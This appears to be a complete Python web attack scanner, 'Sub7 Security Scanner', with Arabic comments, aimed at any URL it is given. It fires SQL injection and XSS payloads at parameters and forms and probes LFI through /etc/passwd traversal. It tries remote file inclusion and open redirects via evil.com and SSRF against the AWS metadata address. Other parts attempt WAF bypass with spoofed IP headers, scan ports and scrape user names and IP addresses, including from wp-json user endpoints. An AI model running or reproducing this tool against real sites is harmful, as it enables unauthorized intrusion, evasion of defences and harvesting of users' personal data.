import requests
import argparse
import socket
import threading
import re
import time
import random
import sys
import os
import subprocess
import colorama
from colorama import Fore, Style, Back
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor

# تهيئة colorama
colorama.init(autoreset=True)

# عرض معلومات المبرمج بشكل جميل
def display_programmer_info():
    programmer_name = "Saudi Linux"
    programmer_email = "SaudiLinux7@gmail.com"
    
    # تصميم إطار للعرض
    width = 60
    print(Fore.GREEN + "\n" + "*" * width)
    print(Fore.GREEN + "*" + " " * (width-2) + "*")
    
    # عرض اسم الأداة
    tool_name = "SUB7 SECURITY SCANNER"
    padding = (width - len(tool_name) - 2) // 2
    print(Fore.GREEN + "*" + " " * padding + Style.BRIGHT + tool_name + " " * (width - len(tool_name) - 2 - padding) + "*")
    
    # عرض معلومات المبرمج
    name_line = f"Developer: {programmer_name}"
    email_line = f"Email: {programmer_email}"
    padding_name = (width - len(name_line) - 2) // 2
    padding_email = (width - len(email_line) - 2) // 2
    
    print(Fore.GREEN + "*" + " " * (width-2) + "*")
    print(Fore.GREEN + "*" + " " * padding_name + Style.BRIGHT + name_line + " " * (width - len(name_line) - 2 - padding_name) + "*")
    print(Fore.GREEN + "*" + " " * padding_email + Style.BRIGHT + email_line + " " * (width - len(email_line) - 2 - padding_email) + "*")
    
    print(Fore.GREEN + "*" + " " * (width-2) + "*")
    print(Fore.GREEN + "*" * width + "\n")

# التحقق من التحديثات وتثبيتها
def check_for_updates():
    print(Fore.YELLOW + "[*] التحقق من التحديثات...")
    try:
        # تحديث المكتبات من ملف requirements.txt
        if os.path.exists("requirements.txt"):
            subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", "requirements.txt", "--upgrade"])
            print(Fore.GREEN + "[+] تم تحديث جميع المكتبات بنجاح.")
        else:
            print(Fore.RED + "[-] ملف requirements.txt غير موجود.")
    except Exception as e:
        print(Fore.RED + f"[-] حدث خطأ أثناء التحديث: {str(e)}")

# فحص ثغرات SQL Injection
def scan_sql_injection(url):
    print(Fore.YELLOW + f"\n[*] فحص ثغرات SQL Injection في {url}")
    # قائمة بأنماط SQL Injection للاختبار
    payloads = [
        "' OR '1'='1", 
        "\" OR \"1\"=\"1", 
        "1' OR '1'='1'--", 
        "1\" OR \"1\"=\"1\"--", 
        "' OR 1=1--", 
        "\" OR 1=1--", 
        "' OR '1'='1' --",
        "admin'--"
    ]
    
    vulnerable = False
    for payload in payloads:
        try:
            # تجربة الرابط الأصلي مع إضافة payload
            test_url = f"{url}?id={payload}"
            response = requests.get(test_url)
            
            # البحث عن أنماط أخطاء SQL في الاستجابة
            error_patterns = [
                "SQL syntax", "mysql_fetch", "mysqli_fetch", "ORA-", 
                "Microsoft SQL", "PostgreSQL", "SQLite", "syntax error"
            ]
            
            for pattern in error_patterns:
                if pattern.lower() in response.text.lower():
                    print(Fore.RED + f"[!] الموقع معرض لثغرة SQL Injection باستخدام: {payload}")
                    print(Fore.RED + f"[!] نمط الخطأ المكتشف: {pattern}")
                    vulnerable = True
                    break
            
            if vulnerable:
                break
                
        except Exception as e:
            print(Fore.RED + f"[-] خطأ أثناء فحص SQL Injection: {str(e)}")
    
    if not vulnerable:
        print(Fore.GREEN + "[+] لم يتم العثور على ثغرات SQL Injection واضحة.")
    
    return vulnerable

# فحص ثغرات XSS
def scan_xss(url):
    print(Fore.YELLOW + f"\n[*] فحص ثغرات XSS في {url}")
    # قائمة بأنماط XSS للاختبار
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "\"><script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>"
    ]
    
    vulnerable = False
    
    try:
        # الحصول على جميع نماذج الإدخال في الصفحة
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        if not forms:
            print(Fore.YELLOW + "[*] لم يتم العثور على نماذج في الصفحة للاختبار.")
            # اختبار الرابط مباشرة
            for payload in payloads:
                test_url = f"{url}?test={payload}"
                response = requests.get(test_url)
                if payload in response.text:
                    print(Fore.RED + f"[!] الموقع قد يكون معرضًا لثغرة XSS باستخدام: {payload}")
                    vulnerable = True
                    break
        else:
            print(Fore.YELLOW + f"[*] تم العثور على {len(forms)} نموذج للاختبار.")
            
            for i, form in enumerate(forms):
                print(Fore.YELLOW + f"[*] اختبار النموذج #{i+1}")
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                
                # بناء URL كامل للنموذج
                if action:
                    form_url = urljoin(url, action)
                else:
                    form_url = url
                
                # جمع جميع حقول الإدخال
                inputs = {}
                for input_field in form.find_all(['input', 'textarea']):
                    input_name = input_field.get('name')
                    if input_name:
                        inputs[input_name] = ""
                
                # اختبار كل حقل مع كل payload
                for input_name in inputs.keys():
                    for payload in payloads:
                        test_inputs = inputs.copy()
                        test_inputs[input_name] = payload
                        
                        try:
                            if method == "post":
                                response = requests.post(form_url, data=test_inputs)
                            else:
                                response = requests.get(form_url, params=test_inputs)
                                
                            if payload in response.text:
                                print(Fore.RED + f"[!] النموذج في {form_url} معرض لثغرة XSS")
                                print(Fore.RED + f"[!] الحقل المعرض: {input_name}")
                                print(Fore.RED + f"[!] Payload: {payload}")
                                vulnerable = True
                                break
                        except Exception as e:
                            print(Fore.RED + f"[-] خطأ أثناء اختبار XSS: {str(e)}")
                    
                    if vulnerable:
                        break
                        
                if vulnerable:
                    break
    
    except Exception as e:
        print(Fore.RED + f"[-] خطأ أثناء فحص XSS: {str(e)}")
    
    if not vulnerable:
        print(Fore.GREEN + "[+] لم يتم العثور على ثغرات XSS واضحة.")
    
    return vulnerable

# فحص ثغرات PHP
def scan_php_vulnerabilities(url):
    print(Fore.YELLOW + f"\n[*] فحص ثغرات PHP في {url}")
    
    # قائمة بالمسارات الشائعة لملفات PHP التي قد تكون معرضة
    php_paths = [
        "phpinfo.php", "info.php", "test.php", "php_info.php", "i.php",
        "admin/", "admin.php", "administrator/", "login.php", "wp-login.php",
        "wp-admin/", "configuration.php", "config.php", "config.inc.php",
        "backup/", "backup.php", "backup.sql", "database.sql", "db.sql",
        "dump.sql", "mysql.sql", "setup.php", "install.php", "install/"
    ]
    
    # قائمة بأنماط اختبار ثغرات LFI/RFI
    lfi_rfi_payloads = [
        "?file=../../../../etc/passwd",
        "?page=../../../../etc/passwd",
        "?include=../../../../etc/passwd",
        "?inc=../../../../etc/passwd",
        "?file=http://evil.com/malicious.txt",
        "?page=http://evil.com/malicious.txt"
    ]
    
    found_issues = False
    base_url = url.rstrip('/')
    
    # فحص ملفات PHP الشائعة
    for path in php_paths:
        try:
            test_url = f"{base_url}/{path}"
            response = requests.get(test_url, timeout=5)
            
            if response.status_code == 200:
                print(Fore.YELLOW + f"[!] تم العثور على ملف/مجلد PHP: {test_url}")
                
                # التحقق من وجود معلومات حساسة
                if "phpinfo()" in response.text or "PHP Version" in response.text:
                    print(Fore.RED + f"[!] تم العثور على صفحة phpinfo في: {test_url}")
                    found_issues = True
                    
                if "admin" in path.lower() or "login" in path.lower():
                    print(Fore.YELLOW + f"[!] تم العثور على صفحة إدارة محتملة: {test_url}")
                    found_issues = True
                    
                if "config" in path.lower() or "setup" in path.lower() or "install" in path.lower():
                    print(Fore.YELLOW + f"[!] تم العثور على صفحة تكوين محتملة: {test_url}")
                    found_issues = True
                    
                if "backup" in path.lower() or ".sql" in path.lower():
                    print(Fore.RED + f"[!] تم العثور على ملف نسخة احتياطية محتمل: {test_url}")
                    found_issues = True
        
        except Exception as e:
            continue
    
    # فحص ثغرات LFI/RFI
    for payload in lfi_rfi_payloads:
        try:
            test_url = f"{base_url}/index.php{payload}"
            response = requests.get(test_url, timeout=5)
            
            # البحث عن أنماط تشير إلى نجاح LFI
            if "root:" in response.text and ":/bin/bash" in response.text:
                print(Fore.RED + f"[!] الموقع معرض لثغرة LFI: {test_url}")
                found_issues = True
                break
        
        except Exception as e:
            continue
    
    if not found_issues:
        print(Fore.GREEN + "[+] لم يتم العثور على ثغرات PHP واضحة.")
    
    return found_issues

# فحص ثغرات URL
def scan_url_vulnerabilities(url):
    print(Fore.YELLOW + f"\n[*] فحص ثغرات URL في {url}")
    
    # قائمة بأنماط اختبار ثغرات Open Redirect
    redirect_payloads = [
        "?redirect=https://evil.com",
        "?url=https://evil.com",
        "?next=https://evil.com",
        "?redir=https://evil.com",
        "?return_url=https://evil.com",
        "?return_to=https://evil.com",
        "?location=https://evil.com",
        "?redirect_uri=https://evil.com"
    ]
    
    found_issues = False
    base_url = url.rstrip('/')
    
    # فحص ثغرات Open Redirect
    for payload in redirect_payloads:
        try:
            test_url = f"{base_url}/{payload}"
            response = requests.get(test_url, timeout=5, allow_redirects=False)
            
            # التحقق من وجود رمز إعادة توجيه وعنوان URL المستهدف في الرأس
            if response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                if 'evil.com' in location:
                    print(Fore.RED + f"[!] الموقع معرض لثغرة Open Redirect: {test_url}")
                    print(Fore.RED + f"[!] يعيد التوجيه إلى: {location}")
                    found_issues = True
        
        except Exception as e:
            continue
    
    # فحص ثغرات SSRF
    ssrf_payloads = [
        f"?url=http://localhost",
        f"?url=http://127.0.0.1",
        f"?url=http://0.0.0.0",
        f"?url=http://169.254.169.254", # عنوان AWS metadata
        f"?url=file:///etc/passwd"
    ]
    
    for payload in ssrf_payloads:
        try:
            test_url = f"{base_url}/{payload}"
            response = requests.get(test_url, timeout=5)
            
            # البحث عن أنماط تشير إلى نجاح SSRF
            if "root:" in response.text or "localhost" in response.text or "127.0.0.1" in response.text:
                print(Fore.RED + f"[!] الموقع قد يكون معرضًا لثغرة SSRF: {test_url}")
                found_issues = True
                break
        
        except Exception as e:
            continue
    
    if not found_issues:
        print(Fore.GREEN + "[+] لم يتم العثور على ثغرات URL واضحة.")
    
    return found_issues

# استخراج الروابط المخفية
def extract_hidden_links(url):
    print(Fore.YELLOW + f"\n[*] استخراج الروابط المخفية من {url}")
    found_links = set()
    base_url = url.rstrip('/')
    parsed_url = urlparse(url)
    domain = parsed_url.netloc
    
    try:
        # فحص ملف robots.txt
        robots_url = f"{parsed_url.scheme}://{domain}/robots.txt"
        response = requests.get(robots_url, timeout=5)
        if response.status_code == 200:
            print(Fore.YELLOW + f"[*] تم العثور على ملف robots.txt")
            lines = response.text.split('\n')
            for line in lines:
                if line.lower().startswith('disallow:') or line.lower().startswith('allow:'):
                    path = line.split(':', 1)[1].strip()
                    if path and path != '/':
                        full_url = f"{parsed_url.scheme}://{domain}{path}"
                        found_links.add(full_url)
                        print(Fore.GREEN + f"[+] تم العثور على رابط في robots.txt: {full_url}")
    except Exception as e:
        print(Fore.RED + f"[-] خطأ أثناء فحص robots.txt: {str(e)}")
    
    try:
        # فحص الصفحة الرئيسية للروابط المخفية
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # البحث عن الروابط في التعليقات HTML
        comments = soup.find_all(string=lambda text: isinstance(text, str) and '<!--' in text)
        for comment in comments:
            urls = re.findall(r'https?://[\w\.-]+(?:/[\w\.-]+)*/?', comment)
            for found_url in urls:
                found_links.add(found_url)
                print(Fore.GREEN + f"[+] تم العثور على رابط في تعليق HTML: {found_url}")
        
        # البحث عن الروابط في ملفات JavaScript
        scripts = soup.find_all('script')
        for script in scripts:
            if script.has_attr('src') and script['src']:
                js_url = urljoin(url, script['src'])
                try:
                    js_response = requests.get(js_url, timeout=5)
                    urls = re.findall(r'[\'"](https?://[\w\.-]+(?:/[\w\.-]+)*/?|/[\w\.-]+(?:/[\w\.-]+)*/?)[\'"]', js_response.text)
                    for found_url in urls:
                        if found_url.startswith('/'):
                            full_url = f"{parsed_url.scheme}://{domain}{found_url}"
                        else:
                            full_url = found_url
                        found_links.add(full_url)
                        print(Fore.GREEN + f"[+] تم العثور على رابط في ملف JavaScript: {full_url}")
                except Exception as e:
                    continue
        
        # البحث عن عناصر HTML المخفية
        hidden_elements = soup.find_all(attrs={'style': re.compile(r'display:\s*none|visibility:\s*hidden')})
        hidden_elements += soup.find_all(attrs={'hidden': True})
        hidden_elements += soup.find_all(attrs={'type': 'hidden'})
        
        for element in hidden_elements:
            links = element.find_all('a')
            for link in links:
                if link.has_attr('href'):
                    full_url = urljoin(url, link['href'])
                    found_links.add(full_url)
                    print(Fore.GREEN + f"[+] تم العثور على رابط في عنصر مخفي: {full_url}")
    
    except Exception as e:
        print(Fore.RED + f"[-] خطأ أثناء استخراج الروابط المخفية: {str(e)}")
    
    print(Fore.YELLOW + f"[*] تم العثور على {len(found_links)} رابط مخفي.")
    return list(found_links)

# تجاوز جدار حماية تطبيقات الويب
def bypass_waf(url):
    print(Fore.YELLOW + f"\n[*] محاولة تجاوز جدار حماية تطبيقات الويب لـ {url}")
    
    # قائمة برؤوس HTTP المخصصة للتجاوز
    bypass_headers = [
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Host": "127.0.0.1"},
        {"X-Forwarded-Host": "127.0.0.1"},
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    ]
    
    success = False
    original_response = None
    
    try:
        # الحصول على الاستجابة الأصلية
        original_response = requests.get(url, timeout=10)
        original_status = original_response.status_code
        original_length = len(original_response.text)
        
        print(Fore.YELLOW + f"[*] الاستجابة الأصلية: الحالة {original_status}, الحجم {original_length} بايت")
        
        # تجربة رؤوس HTTP المختلفة
        for headers in bypass_headers:
            try:
                header_name = list(headers.keys())[0]
                response = requests.get(url, headers=headers, timeout=10)
                
                # مقارنة الاستجابة مع الاستجابة الأصلية
                if response.status_code != original_status or abs(len(response.text) - original_length) > 100:
                    print(Fore.GREEN + f"[+] تم اكتشاف تغيير في الاستجابة باستخدام الرأس: {header_name}")
                    print(Fore.GREEN + f"[+] الحالة الجديدة: {response.status_code}, الحجم: {len(response.text)} بايت")
                    success = True
            except Exception as e:
                continue
        
        # تجربة تقنيات أخرى للتجاوز
        evasion_techniques = [
            {"params": {"_": int(time.time())}},  # إضافة معلمة عشوائية
            {"params": {"bypass": "true"}},
            {"headers": {"Accept-Language": "en-US,en;q=0.9"}},
            {"headers": {"Cookie": "session=test"}}
        ]
        
        for technique in evasion_techniques:
            try:
                if "params" in technique:
                    response = requests.get(url, params=technique["params"], timeout=10)
                elif "headers" in technique:
                    response = requests.get(url, headers=technique["headers"], timeout=10)
                
                # مقارنة الاستجابة مع الاستجابة الأصلية
                if response.status_code != original_status or abs(len(response.text) - original_length) > 100:
                    technique_name = "params" if "params" in technique else "headers"
                    technique_value = technique[technique_name]
                    print(Fore.GREEN + f"[+] تم اكتشاف تغيير في الاستجابة باستخدام {technique_name}: {technique_value}")
                    print(Fore.GREEN + f"[+] الحالة الجديدة: {response.status_code}, الحجم: {len(response.text)} بايت")
                    success = True
            except Exception as e:
                continue
    
    except Exception as e:
        print(Fore.RED + f"[-] خطأ أثناء محاولة تجاوز WAF: {str(e)}")
    
    if not success:
        print(Fore.YELLOW + "[*] لم يتم اكتشاف تغييرات واضحة في الاستجابة. قد لا يكون هناك WAF أو لم يتم تجاوزه.")
    
    return success

# فحص المنافذ المفتوحة
def scan_port(target, port, open_ports):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            service = get_service_name(port)
            risk = get_port_risk(port)
            open_ports.append((port, service, risk))
        sock.close()
    except:
        pass

# الحصول على اسم الخدمة للمنفذ
def get_service_name(port):
    common_ports = {
        21: "FTP",
        22: "SSH",
        23: "Telnet",
        25: "SMTP",
        53: "DNS",
        80: "HTTP",
        110: "POP3",
        135: "MSRPC",
        139: "NetBIOS",
        143: "IMAP",
        443: "HTTPS",
        445: "SMB",
        993: "IMAPS",
        995: "POP3S",
        1433: "MSSQL",
        1521: "Oracle",
        3306: "MySQL",
        3389: "RDP",
        5432: "PostgreSQL",
        5900: "VNC",
        8080: "HTTP-Proxy",
        8443: "HTTPS-Alt"
    }
    return common_ports.get(port, "Unknown")

# تقييم مستوى الخطورة للمنفذ
def get_port_risk(port):
    high_risk_ports = [21, 23, 135, 139, 445, 1433, 1521, 3306, 3389, 5432, 5900]
    medium_risk_ports = [22, 25, 53, 110, 143, 993, 995, 8080]
    
    if port in high_risk_ports:
        return "عالي"
    elif port in medium_risk_ports:
        return "متوسط"
    else:
        return "منخفض"

# فحص المنافذ المفتوحة على الخادم
def scan_open_ports(target, port_range=None):
    if port_range is None:
        port_range = range(1, 1025)  # المنافذ الافتراضية للفحص
    
    print(Fore.YELLOW + f"\n[*] فحص المنافذ المفتوحة على {target}")
    print(Fore.YELLOW + f"[*] نطاق المنافذ: {port_range.start}-{port_range.stop-1}")
    
    try:
        # التحقق من صحة الهدف (تحويل اسم النطاق إلى IP إذا لزم الأمر)
        try:
            ip = socket.gethostbyname(target)
            print(Fore.YELLOW + f"[*] تم تحويل {target} إلى IP: {ip}")
            target = ip
        except socket.gaierror:
            print(Fore.RED + f"[-] لا يمكن حل اسم النطاق {target}")
            return []
        
        open_ports = []
        threads = []
        
        # استخدام متعدد المسارات لتسريع الفحص
        with ThreadPoolExecutor(max_workers=100) as executor:
            for port in port_range:
                threads.append(executor.submit(scan_port, target, port, open_ports))
            
            # عرض شريط التقدم
            total_ports = len(port_range)
            completed = 0
            while completed < total_ports:
                done_count = sum(1 for t in threads if t.done())
                if done_count > completed:
                    completed = done_count
                    progress = (completed / total_ports) * 100
                    sys.stdout.write(f"\r[*] تقدم الفحص: {progress:.1f}% ({completed}/{total_ports})")
                    sys.stdout.flush()
                time.sleep(0.1)
            
            print("\n")
        
        # ترتيب المنافذ المفتوحة
        open_ports.sort(key=lambda x: x[0])
        
        if open_ports:
            print(Fore.GREEN + f"[+] تم العثور على {len(open_ports)} منفذ مفتوح:")
            print(Fore.GREEN + "    " + "-"*60)
            print(Fore.GREEN + "    | " + "المنفذ".ljust(10) + " | " + "الخدمة".ljust(15) + " | " + "مستوى الخطورة".ljust(15) + " |")
            print(Fore.GREEN + "    " + "-"*60)
            
            for port, service, risk in open_ports:
                risk_color = Fore.RED if risk == "عالي" else (Fore.YELLOW if risk == "متوسط" else Fore.GREEN)
                print(Fore.GREEN + "    | " + str(port).ljust(10) + " | " + service.ljust(15) + " | " + risk_color + risk.ljust(15) + Fore.GREEN + " |")
            
            print(Fore.GREEN + "    " + "-"*60)
        else:
            print(Fore.YELLOW + "[*] لم يتم العثور على منافذ مفتوحة في النطاق المحدد.")
        
        return open_ports
    
    except Exception as e:
        print(Fore.RED + f"[-] خطأ أثناء فحص المنافذ: {str(e)}")
        return []

# عرض المستخدمين المتصلين بالموقع وعناوين IP الخاصة بهم
def scan_online_users(url):
    print(Fore.YELLOW + f"\n[*] فحص المستخدمين المتصلين بالموقع {url}")
    
    try:
        # الحصول على صفحة الموقع
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # البحث عن مؤشرات للمستخدمين المتصلين
        online_users = []
        
        # البحث في عناصر HTML التي قد تحتوي على معلومات المستخدمين المتصلين
        user_elements = soup.find_all(['div', 'span', 'li'], class_=lambda c: c and any(x in c.lower() for x in ['user', 'online', 'member', 'active', 'logged']))
        
        for element in user_elements:
            user_info = element.get_text().strip()
            if user_info and len(user_info) < 100:  # تجنب النصوص الطويلة
                online_users.append(user_info)
        
        # البحث عن صفحات خاصة بالمستخدمين المتصلين
        online_pages = [
            "online-users", "active-users", "whos-online", "online-members",
            "users/online", "members/online", "online", "active"
        ]
        
        for page in online_pages:
            try:
                page_url = f"{url.rstrip('/')}/{page}"
                page_response = requests.get(page_url, timeout=5)
                
                if page_response.status_code == 200:
                    print(Fore.YELLOW + f"[*] تم العثور على صفحة محتملة للمستخدمين المتصلين: {page_url}")
                    page_soup = BeautifulSoup(page_response.text, 'html.parser')
                    
                    # البحث عن قوائم المستخدمين
                    user_lists = page_soup.find_all(['ul', 'ol', 'div'], class_=lambda c: c and any(x in c.lower() for x in ['user-list', 'member-list', 'online-list', 'users', 'members']))
                    
                    for user_list in user_lists:
                        items = user_list.find_all(['li', 'div'])
                        for item in items:
                            user_info = item.get_text().strip()
                            if user_info and len(user_info) < 100:
                                online_users.append(user_info)
            except Exception:
                continue
        
        # البحث عن عناوين IP في الصفحة (قد تكون متاحة في بعض المنتديات أو لوحات الإدارة)
        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
        ip_addresses = re.findall(ip_pattern, response.text)
        
        # عرض النتائج
        if online_users:
            print(Fore.GREEN + f"[+] تم العثور على {len(online_users)} مستخدم متصل محتمل:")
            for i, user in enumerate(online_users):
                print(Fore.GREEN + f"    {i+1}. {user}")
        else:
            print(Fore.YELLOW + "[*] لم يتم العثور على معلومات واضحة عن المستخدمين المتصلين.")
            print(Fore.YELLOW + "[*] قد تحتاج إلى تسجيل الدخول أو الوصول إلى لوحة الإدارة لرؤية هذه المعلومات.")
        
        if ip_addresses:
            print(Fore.GREEN + f"\n[+] تم العثور على {len(ip_addresses)} عنوان IP محتمل:")
            for i, ip in enumerate(ip_addresses):
                print(Fore.GREEN + f"    {i+1}. {ip}")
        else:
            print(Fore.YELLOW + "\n[*] لم يتم العثور على عناوين IP واضحة في الصفحة.")
        
        # محاولة الوصول إلى معلومات إضافية من خلال API أو نقاط النهاية الشائعة
        api_endpoints = [
            "api/users/online", "api/members/active", "api/online", "users/api/online",
            "wp-json/wp/v2/users", "api/v1/users", "api/v2/users"
        ]
        
        for endpoint in api_endpoints:
            try:
                api_url = f"{url.rstrip('/')}/{endpoint}"
                api_response = requests.get(api_url, timeout=5)
                
                if api_response.status_code == 200:
                    try:
                        # محاولة تحليل البيانات كـ JSON
                        json_data = api_response.json()
                        print(Fore.GREEN + f"\n[+] تم العثور على API محتمل للمستخدمين: {api_url}")
                        print(Fore.GREEN + f"[+] استجابة API: {json_data}")
                    except:
                        pass
            except Exception:
                continue
        
        return online_users, ip_addresses
    
    except Exception as e:
        print(Fore.RED + f"[-] خطأ أثناء فحص المستخدمين المتصلين: {str(e)}")
        return [], []

# الدالة الرئيسية
def main():
    # عرض معلومات المبرمج
    display_programmer_info()
    
    # التحقق من التحديثات
    check_for_updates()
    
    # إعداد محلل وسيطات سطر الأوامر
    parser = argparse.ArgumentParser(description='Sub7 Security Scanner - أداة فحص أمان المواقع')
    parser.add_argument('-u', '--url', help='URL الموقع المستهدف للفحص')
    parser.add_argument('--sql', action='store_true', help='فحص ثغرات SQL Injection فقط')
    parser.add_argument('--xss', action='store_true', help='فحص ثغرات XSS فقط')
    parser.add_argument('--php', action='store_true', help='فحص ثغرات PHP فقط')
    parser.add_argument('--url-vuln', action='store_true', help='فحص ثغرات URL فقط')
    parser.add_argument('--extract-links', action='store_true', help='استخراج الروابط المخفية فقط')
    parser.add_argument('--bypass-waf', action='store_true', help='محاولة تجاوز جدار حماية تطبيقات الويب فقط')
    parser.add_argument('--port-scan', action='store_true', help='فحص المنافذ المفتوحة فقط')
    parser.add_argument('--port-range', help='نطاق المنافذ للفحص (مثال: 1-1000)')
    parser.add_argument('--online-users', action='store_true', help='فحص المستخدمين المتصلين وعناوين IP')
    parser.add_argument('--all', action='store_true', help='تنفيذ جميع عمليات الفحص')
    
    args = parser.parse_args()
    
    # التحقق من وجود URL
    if not args.url:
        parser.print_help()
        print(Fore.RED + "\n[-] يجب تحديد URL الموقع المستهدف باستخدام الخيار -u أو --url")
        return
    
    url = args.url
    if not url.startswith('http'):
        url = 'http://' + url
    
    print(Fore.YELLOW + f"[*] بدء فحص الموقع: {url}")
    
    # تحديد نطاق المنافذ إذا تم توفيره
    port_range = None
    if args.port_range:
        try:
            start, end = map(int, args.port_range.split('-'))
            port_range = range(start, end + 1)
        except ValueError:
            print(Fore.RED + "[-] تنسيق نطاق المنافذ غير صالح. استخدم التنسيق: start-end (مثال: 1-1000)")
            return
    
    # تنفيذ عمليات الفحص المطلوبة
    if args.all or (not any([args.sql, args.xss, args.php, args.url_vuln, args.extract_links, args.bypass_waf, args.port_scan, args.online_users])):
        scan_sql_injection(url)
        scan_xss(url)
        scan_php_vulnerabilities(url)
        scan_url_vulnerabilities(url)
        hidden_links = extract_hidden_links(url)
        bypass_waf(url)
        
        # فحص الروابط المخفية للثغرات
        if hidden_links:
            print(Fore.YELLOW + "\n[*] فحص الروابط المخفية للثغرات...")
            for link in hidden_links:
                print(Fore.YELLOW + f"\n[*] فحص الرابط المخفي: {link}")
                scan_sql_injection(link)
                scan_xss(link)
        
        # استخراج اسم النطاق من URL للفحص
        parsed_url = urlparse(url)
        domain = parsed_url.netloc
        scan_open_ports(domain, port_range)
        
        # فحص المستخدمين المتصلين وعناوين IP
        scan_online_users(url)
    else:
        if args.sql:
            scan_sql_injection(url)
        if args.xss:
            scan_xss(url)
        if args.php:
            scan_php_vulnerabilities(url)
        if args.url_vuln:
            scan_url_vulnerabilities(url)
        if args.extract_links:
            hidden_links = extract_hidden_links(url)
        if args.bypass_waf:
            bypass_waf(url)
        if args.port_scan:
            # استخراج اسم النطاق من URL للفحص
            parsed_url = urlparse(url)
            domain = parsed_url.netloc
            scan_open_ports(domain, port_range)
        if args.online_users:
            scan_online_users(url)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[-] تم إيقاف الفحص بواسطة المستخدم.")
    except Exception as e:
        print(Fore.RED + f"\n[-] حدث خطأ غير متوقع: {str(e)}")